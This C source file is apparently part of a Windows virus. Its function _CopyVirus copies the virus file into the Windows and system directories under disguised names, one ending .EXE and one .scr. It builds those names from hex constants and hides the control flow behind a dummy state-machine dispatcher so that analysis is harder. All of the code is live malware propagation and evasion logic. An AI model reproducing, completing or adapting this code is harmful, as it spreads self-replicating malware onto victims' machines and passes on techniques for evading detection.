#pragma optimize("", off)
#include "data_globals.h"
#include <windows.h>
#include <string.h>

void _CopyVirus(void)
{
    volatile int dummy_state = 1;
    char windir[256];
    char windir2[256];
    char windoze[271];
    char windoze2[271];
    int len_windoze, len_windoze2;
    char sysdir[256];
    char sysdir2[256];
    char sysdoze[271];
    char sysdoze2[271];
    int len_sysdoze, len_sysdoze2;

dummy_dispatcher:
    if (dummy_state == 1) goto block1;
    if (dummy_state == 2) goto block2;
    if (dummy_state == 3) goto block3;
    if (dummy_state == 4) goto block4;
    if (dummy_state == 5) goto block5;
    if (dummy_state == 6) goto block6;
    if (dummy_state == 7) goto block7;
    if (dummy_state == 8) goto block8;
    if (dummy_state == 0) goto end;

block1:
    GetWindowsDirectoryA(windir, sizeof(windir));
    GetWindowsDirectoryA(windir2, sizeof(windir2));
    dummy_state = 2;
    goto dummy_dispatcher;

block2:
    strcpy(windoze, windir);
    len_windoze = strlen(windoze);
    *(uint32_t *)(windoze + len_windoze) = 0x5341545c;
    *(uint32_t *)(windoze + len_windoze + 4) = 0x414f4d4b;
    *(uint32_t *)(windoze + len_windoze + 8) = 0x58452e4e;
    *((uint16_t *)(windoze + len_windoze + 12)) = 0x45;
    dummy_state = 3;
    goto dummy_dispatcher;

block3:
    strcpy(windoze2, windir2);
    len_windoze2 = strlen(windoze2);
    *(uint32_t *)(windoze2 + len_windoze2) = 0x5341545c;
    *(uint32_t *)(windoze2 + len_windoze2 + 4) = 0x414f4d4b;
    *(uint32_t *)(windoze2 + len_windoze2 + 8) = 0x58452e4e;
    *((uint16_t *)(windoze2 + len_windoze2 + 12)) = 0x45;
    dummy_state = 4;
    goto dummy_dispatcher;

block4:
    CopyFileA(_VirusPath, windoze, 0);
    dummy_state = 5;
    goto dummy_dispatcher;

block5:
    GetSystemDirectoryA(sysdir, sizeof(sysdir));
    GetSystemDirectoryA(sysdir2, sizeof(sysdir2));
    dummy_state = 6;
    goto dummy_dispatcher;

block6:
    strcpy(sysdoze, sysdir);
    len_sysdoze = strlen(sysdoze);
    *(uint32_t *)(sysdoze + len_sysdoze) = 0x6242425c;
    *(uint32_t *)(sysdoze + len_sysdoze + 4) = 0x4244574c;
    *(uint32_t *)(sysdoze + len_sysdoze + 8) = 0x7263532e;
    *((char *)(sysdoze + len_sysdoze + 12)) = 0;
    dummy_state = 7;
    goto dummy_dispatcher;

block7:
    strcpy(sysdoze2, sysdir2);
    len_sysdoze2 = strlen(sysdoze2);
    *(uint32_t *)(sysdoze2 + len_sysdoze2) = 0x6242425c;
    *(uint32_t *)(sysdoze2 + len_sysdoze2 + 4) = 0x4244574c;
    *(uint32_t *)(sysdoze2 + len_sysdoze2 + 8) = 0x7263532e;
    *((char *)(sysdoze2 + len_sysdoze2 + 12)) = 0;
    dummy_state = 8;
    goto dummy_dispatcher;

block8:
    CopyFileA(_VirusPath, sysdoze, 0);
    dummy_state = 0;
    goto dummy_dispatcher;

end:
    return;
}
#pragma optimize("", on)
